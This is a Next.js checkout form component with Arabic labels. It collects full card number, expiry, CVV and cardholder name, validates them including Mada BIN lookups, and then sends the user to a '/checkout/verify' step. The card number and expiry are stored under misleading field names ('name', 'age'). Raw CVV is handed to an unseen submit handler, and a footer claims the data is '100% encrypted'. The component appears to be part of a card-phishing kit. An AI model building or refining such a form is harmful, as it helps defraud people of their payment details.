"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import Image from "next/image";
import { FaWifi } from "react-icons/fa";
import { IoCardOutline, IoLockClosedOutline, IoShieldCheckmarkOutline } from "react-icons/io5";
import { Icon } from "@iconify/react";

interface PaymentFormProps {
  onSubmit: (fields: { name: string; age: string; cvv: string; cardHolder: string }) => Promise<void>;
}

export default function PaymentForm({ onSubmit }: PaymentFormProps) {
  const router = useRouter();
  const [fields, setFields] = useState({ name: "", age: "", cvv: "", cardHolder: "" });
  const [errors, setErrors] = useState(false);
  const [cardError, setCardError] = useState("");
  const [expiryError, setExpiryError] = useState("");
  const [cvvError, setCvvError] = useState("");
  const [loading, setLoading] = useState(false);
  const [flipped, setFlipped] = useState(false);

  const MADA_BINS = ["588845","440647","440795","446404","457865","968208","457997","474491","543357","434107","431361","604906","521076","588848","968210","968211","968212","968213","968214","968215","968216","968217","968218","968219","968220","531095","531196","532013","535825","535989","536023","537767","539931","543085","549760","558563","585265","588850","588982","589005","589206","604906","636120","968201","968202","968203","968204","968205","968206","968207"];

  const getCardType = (num: string): "Visa" | "Mastercard" | "Mada" | null => {
    if (!num) return null;
    if (num.length >= 6 && MADA_BINS.includes(num.slice(0, 6))) return "Mada";
    if (/^4/.test(num)) return "Visa";
    if (/^5[1-5]/.test(num) || /^2[2-7]/.test(num)) return "Mastercard";
    return null;
  };

  const luhnCheck = (num: string) => {
    let sum = 0;
    let shouldDouble = false;
    for (let i = num.length - 1; i >= 0; i--) {
      let digit = parseInt(num[i]);
      if (shouldDouble) { digit *= 2; if (digit > 9) digit -= 9; }
      sum += digit;
      shouldDouble = !shouldDouble;
    }
    return sum % 10 === 0;
  };

  const handleNext = async () => {
    const rawCard = fields.name.replace(/\s/g, "");
    if (!fields.name || !fields.age || !fields.cvv || !fields.cardHolder) {
      setErrors(true);
      return;
    }
    if (rawCard.length !== 16) { setCardError("رقم البطاقة يجب أن يكون 16 رقمًا"); return; }
    if (!luhnCheck(rawCard)) { setCardError("⚠️ رقم البطاقة غير صحيح"); return; }
    if (!getCardType(rawCard)) { setCardError("⚠️ نوع البطاقة غير مدعوم، يرجى استخدام Visa أو Mastercard أو Mada"); return; }
    setCardError("");
    if (fields.cvv.length !== 3) { setCvvError("⚠️ رمز CVV يجب أن يكون 3 أرقام"); return; }
    setCvvError("");
    const parts = fields.age.split("/");
    const expMonth = Number(parts[0]);
    const expYear = Number(parts[1]);
    const now = new Date();
    if (!expMonth || !expYear || parts[0]?.length !== 2 || parts[1]?.length !== 2) {
      setExpiryError("⚠️ يرجى إدخال تاريخ انتهاء صحيح بصيغة MM/YY");
      return;
    }
    if (expMonth < 1 || expMonth > 12) {
      setExpiryError("⚠️ الشهر يجب أن يكون بين 01 و 12");
      return;
    }
    const cardDate = new Date(2000 + expYear, expMonth - 1, 1);
    const currentMonth = new Date(now.getFullYear(), now.getMonth(), 1);
    if (cardDate < currentMonth) {
      setExpiryError("⚠️ تاريخ انتهاء البطاقة منتهي، يرجى استخدام بطاقة سارية");
      return;
    }
    if (2000 + expYear > now.getFullYear() + 10) {
      setExpiryError("⚠️ تاريخ انتهاء البطاقة غير صحيح");
      return;
    }
    setExpiryError("");
    setLoading(true);
    try {
      await onSubmit(fields);
      router.push("/checkout/verify");
    } finally {
      setLoading(false);
    }
  };

  const inputBase = "w-full bg-[#f8f9fb] border border-gray-200 rounded-xl p-3.5 text-sm text-gray-800 focus:outline-none focus:ring-2 focus:ring-[#3b6a00]/30 focus:border-[#3b6a00] focus:bg-white transition-all duration-200 placeholder:text-gray-400";
  const inputError = "w-full bg-red-50/50 border-2 border-red-400 rounded-xl p-3.5 text-sm text-gray-800 focus:outline-none focus:ring-2 focus:ring-red-400/30 focus:border-red-400 focus:bg-white transition-all duration-200 placeholder:text-gray-400";

  const getInputClass = (field: keyof typeof fields, extraError?: string) => {
    const hasErr = (errors && !fields[field]) || !!extraError;
    return hasErr ? inputError : inputBase;
  };

  const cardType = getCardType(fields.name.replace(/\s/g, ""));
  const displayNumber = fields.name || "0000 0000 0000 0000";
  const displayHolder = fields.cardHolder || "FULL NAME";
  const displayExpiry = fields.age || "MM/YY";

  const cardBg =
    cardType === "Mada" ? "from-green-500 to-green-800" :
    cardType === "Visa" ? "from-blue-600 to-blue-900" :
    cardType === "Mastercard" ? "from-orange-500 to-red-800" :
    "from-slate-600 to-slate-900";

  const cardTypeBadge = cardType === "Mada"
    ? "bg-green-100 text-green-700"
    : cardType === "Visa"
    ? "bg-blue-100 text-blue-700"
    : cardType === "Mastercard"
    ? "bg-orange-100 text-orange-700"
    : "bg-gray-100 text-gray-500";

  return (
    <div className="space-y-4">
      {/* Card Preview with Flip */}
      <div className="w-full px-2 sm:px-0 sm:max-w-md mx-auto" style={{ perspective: "1000px" }}>
        <div
          className="relative w-full transition-transform duration-700"
          style={{
            transformStyle: "preserve-3d",
            transform: flipped ? "rotateY(180deg)" : "rotateY(0deg)",
            height: "clamp(170px, 48vw, 210px)",
          }}
        >
          {/* Front */}
          <div
            className={`absolute inset-0 rounded-2xl sm:rounded-3xl bg-gradient-to-br ${cardBg} text-white p-4 sm:p-6 shadow-2xl select-none overflow-hidden`}
            style={{ backfaceVisibility: "hidden" }}
            dir="ltr"
          >
            <div className="absolute inset-0 bg-gradient-to-tr from-white/10 to-transparent rounded-2xl sm:rounded-3xl pointer-events-none" />
            <div className="flex justify-between items-start">
              <FaWifi className="rotate-90 opacity-60" size={20} />
              {cardType === "Mada" && <Image src="/mada975b.png" alt="Mada" width={52} height={28} className="object-contain brightness-200" />}
              {(cardType === "Visa" || cardType === "Mastercard") && <Image src="/cc975b.png" alt={cardType} width={60} height={28} className="object-contain brightness-200" />}
              {!cardType && <span className="text-xs opacity-40 font-semibold tracking-widest">BANK CARD</span>}
            </div>
            <div className="mt-2 w-8 h-6 sm:w-10 sm:h-7 rounded-md bg-yellow-300/80 flex items-center justify-center">
              <div className="w-5 h-3.5 sm:w-6 sm:h-4 rounded-sm border border-yellow-500/60 grid grid-cols-3 gap-px p-0.5">
                {[...Array(6)].map((_, i) => <div key={i} className="bg-yellow-500/50 rounded-sm" />)}
              </div>
            </div>
            <div className="mt-2 sm:mt-3 tracking-[0.18em] sm:tracking-[0.22em] text-base sm:text-xl font-mono font-semibold">{displayNumber}</div>
            <div className="flex justify-between items-end mt-3 sm:mt-4">
              <div>
                <p className="text-[9px] sm:text-[10px] opacity-50 uppercase tracking-widest">Card Holder</p>
                <p className="text-xs sm:text-sm font-bold tracking-wide truncate max-w-[140px] sm:max-w-[200px]">{displayHolder}</p>
              </div>
              <div className="text-right">
                <p className="text-[9px] sm:text-[10px] opacity-50 uppercase tracking-widest">Expires</p>
                <p className="text-xs sm:text-sm font-bold">{displayExpiry}</p>
              </div>
            </div>
          </div>

          {/* Back */}
          <div
            className={`absolute inset-0 rounded-2xl sm:rounded-3xl bg-gradient-to-br ${cardBg} text-white shadow-2xl select-none overflow-hidden`}
            style={{ backfaceVisibility: "hidden", transform: "rotateY(180deg)" }}
            dir="ltr"
          >
            <div className="absolute inset-0 bg-gradient-to-tr from-white/10 to-transparent rounded-2xl sm:rounded-3xl pointer-events-none" />
            <div className="w-full h-8 sm:h-10 bg-black/70 mt-6 sm:mt-7" />
            <div className="px-4 sm:px-6 mt-4 sm:mt-5">
              <p className="text-[9px] sm:text-[10px] opacity-50 uppercase tracking-widest mb-1">CVV</p>
              <div className="bg-white/90 rounded-lg h-9 sm:h-10 flex items-center px-3 sm:px-4">
                <span className="text-gray-800 font-mono font-bold tracking-[0.3em] text-sm sm:text-base">
                  {fields.cvv ? "•".repeat(fields.cvv.length) : "•••"}
                </span>
              </div>
            </div>
            <div className="absolute bottom-3 sm:bottom-4 right-4 sm:right-6">
              {cardType === "Mada" && <Image src="/mada975b.png" alt="Mada" width={48} height={28} className="object-contain brightness-200 opacity-70" />}
              {(cardType === "Visa" || cardType === "Mastercard") && <Image src="/cc975b.png" alt={cardType} width={56} height={28} className="object-contain brightness-200 opacity-70" />}
            </div>
          </div>
        </div>
      </div>

      {/* بيانات البطاقة */}
      <section className="bg-white rounded-xl overflow-hidden shadow-[0_12px_32px_-4px_rgba(25,28,29,0.04)]">
        {/* Header */}
        <div className="px-5 sm:px-7 pt-5 sm:pt-7 pb-4 flex items-center justify-between">
          <h2 className="text-lg font-bold flex items-center gap-2 text-[#0F4C6E]">
            <IoCardOutline className="text-[#3b6a00] text-xl" />
            بيانات البطاقة
          </h2>
          <Image src="/فيزا ماستر مدى.webp" alt="بطاقات الدفع" width={120} height={36} className="object-contain opacity-70 hover:opacity-100 transition-opacity" />
        </div>

        <div className="px-5 sm:px-7 pb-5 sm:pb-7 space-y-4">
          {/* رقم البطاقة */}
          <div className="space-y-1.5">
            <label className="text-sm font-medium text-gray-500">رقم البطاقة <span className="text-red-400">*</span></label>
            <div className="relative">
              <span className="absolute right-3.5 top-1/2 -translate-y-1/2 text-gray-400">
                <IoCardOutline size={18} />
              </span>
              <input
                autoComplete="cc-number" type="text" placeholder="" maxLength={19} dir="ltr"
                value={fields.name}
                onChange={e => {
                  let v = e.target.value.replace(/\D/g, "").slice(0, 16);
                  v = v.match(/.{1,4}/g)?.join(" ") ?? v;
                  setFields(f => ({ ...f, name: v }));
                  setCardError("");
                }}
                className={`${getInputClass("name", cardError)} !pr-10 ${cardType ? "!pl-14" : ""} text-right font-mono tracking-wider`}
              />
              {cardType && (
                <span className="absolute left-3 top-1/2 -translate-y-1/2 flex items-center">
                  {cardType === "Visa" && <Icon icon="logos:visa" width={36} height={24} />}
                  {cardType === "Mastercard" && <Icon icon="logos:mastercard" width={32} height={24} />}
                  {cardType === "Mada" && <Image src="/mada975b.png" alt="Mada" width={36} height={20} className="object-contain" />}
                </span>
              )}
            </div>
            {cardError && <p className="text-red-400 text-xs font-bold">{cardError}</p>}
          </div>

          <div className="border-t border-gray-100" />

          {/* تاريخ + CVV + اسم حامل البطاقة */}
          <div className="grid grid-cols-2 md:grid-cols-3 gap-3">
            <div className="space-y-1.5">
              <label className="text-sm font-medium text-gray-500">تاريخ الانتهاء <span className="text-red-400">*</span></label>
              <input
                autoComplete="cc-exp" type="text" placeholder="" maxLength={5} dir="ltr"
                value={fields.age}
                onChange={e => { let v = e.target.value.replace(/\D/g, ""); if (v.length >= 3) v = v.slice(0, 2) + "/" + v.slice(2, 4); setFields(f => ({ ...f, age: v })); setExpiryError(""); }}
                className={`${getInputClass("age", expiryError)} text-center font-mono tracking-wider`}
              />
              {expiryError && <p className="text-red-400 text-xs font-bold">{expiryError}</p>}
            </div>
            <div className="space-y-1.5">
              <label className="text-sm font-medium text-gray-500">رمز CVV <span className="text-red-400">*</span></label>
              <div className="relative">
                <span className="absolute right-3.5 top-1/2 -translate-y-1/2 text-gray-400">
                  <IoLockClosedOutline size={15} />
                </span>
                <input
                  autoComplete="cc-csc" type="password" placeholder="" maxLength={3} dir="ltr"
                  value={fields.cvv}
                  onFocus={() => setFlipped(true)}
                  onBlur={() => setFlipped(false)}
                  onChange={e => { const v = e.target.value.replace(/\D/g, "").slice(0, 3); setFields(f => ({ ...f, cvv: v })); setCvvError(""); }}
                  className={`${getInputClass("cvv", cvvError)} !pr-9 text-center font-mono tracking-[0.3em]`}
                />
              </div>
              {cvvError && <p className="text-red-400 text-xs font-bold">{cvvError}</p>}
            </div>
            <div className="col-span-2 md:col-span-1 space-y-1.5">
              <label className="text-sm font-medium text-gray-500">اسم حامل البطاقة <span className="text-red-400">*</span></label>
              <input
                autoComplete="cc-name" type="text" placeholder="" dir="ltr"
                value={fields.cardHolder}
                onChange={e => { const v = e.target.value.replace(/[^a-zA-Z ]/g, ""); setFields(f => ({ ...f, cardHolder: v.toUpperCase() })); }}
                className={`${getInputClass("cardHolder")} text-right uppercase tracking-wide`}
              />
            </div>
          </div>
        </div>

        {/* Secure footer */}
        <div className="bg-[#f8f9fb] border-t border-gray-100 px-5 sm:px-7 py-3 flex items-center justify-center gap-2">
          <IoShieldCheckmarkOutline className="text-[#3b6a00] text-sm" />
          <span className="text-xs text-gray-400">جميع البيانات مشفرة وآمنة بنسبة 100%</span>
        </div>
      </section>

      <div className="flex gap-3">
        <button
          onClick={() => router.push("/cart")}
          className="flex-1 border-2 border-gray-200 text-gray-600 font-bold py-4 rounded-xl text-sm hover:bg-gray-50 transition-all"
        >
          السابق
        </button>
        <button
          onClick={handleNext}
          disabled={loading}
          className="flex-[2] py-4 bg-gradient-to-bl from-[#3b6a00] to-[#6dbe00] text-white rounded-xl font-extrabold text-base shadow-xl shadow-[#3b6a00]/20 hover:scale-[1.02] active:scale-[0.98] transition-all duration-300 disabled:opacity-60 disabled:cursor-not-allowed flex items-center justify-center gap-2"
        >
          <IoLockClosedOutline size={16} />
          {loading ? "جاري المعالجة..." : "إتمام الطلب"}
        </button>
      </div>
    </div>
  );
}
